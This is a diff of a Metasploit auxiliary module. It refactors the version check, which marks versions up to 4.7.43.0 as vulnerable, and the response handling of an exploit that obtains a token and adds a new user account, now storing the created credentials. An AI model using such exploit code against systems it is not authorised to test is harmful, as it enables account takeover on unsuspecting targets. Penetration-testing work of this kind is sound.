@@ -50,23 +50,14 @@ class MetasploitModule < Msf::Auxiliary
       return CheckCode::Unknown
     end
 
-    if res && res.code == 401
-      data = res.get_json_document
-      version = data['Version']
-      if version.nil?
-        return CheckCode::Unknown
-      else
-        print_status('Version retrieved: ' + version)
-      end
-
-      if Rex::Version.new(version) <= Rex::Version.new('4.7.43.0')
-        return CheckCode::Appears
-      else
-        return CheckCode::Safe
-      end
-    else
-      return CheckCode::Unknown
-    end
+    return CheckCode::Unknown unless res&.code == 401
+    
+    data = res.get_json_document
+    version = data['Version']
+    return CheckCode::Unknown unless !version.nil?
+    print_status('Got version: ' + version)
+    return CheckCode::Safe unless Rex::Version.new(version) <= Rex::Version.new('4.7.43.0')
+    return CheckCode::Appears
   end
 
   def run
@@ -79,8 +70,7 @@ class MetasploitModule < Msf::Auxiliary
     unless res
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
-    case res.code
-    when 200
+    if res.code == 200
       json = res.get_json_document
       if json.key?('passwordRandom') && json.key?('serial')
         password_random = json['passwordRandom']
@@ -115,8 +105,7 @@ class MetasploitModule < Msf::Auxiliary
     unless res
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
-    case res.code
-    when 200
+    if res.code == 200
       json = res.get_json_document
       if json.key?('accessToken')
         access_token = json['accessToken']
@@ -149,10 +138,10 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    case res.code
-    when 200
+    if res.code == 200
       json = res.get_json_document
       if json.key?('code') && json['code'] == 200 && json.key?('error') && json['error'] == 'OK'
+        store_valid_credential(user: datastore['NEW_USER'], private: datastore['NEW_PASSWORD'], proof: json)
         print_good("New user '#{datastore['NEW_USER']}:#{datastore['NEW_PASSWORD']}' was successfully added.")
         print_good("Login at: https://#{datastore['RHOSTS']}:#{datastore['RPORT']}/#/login")
       else
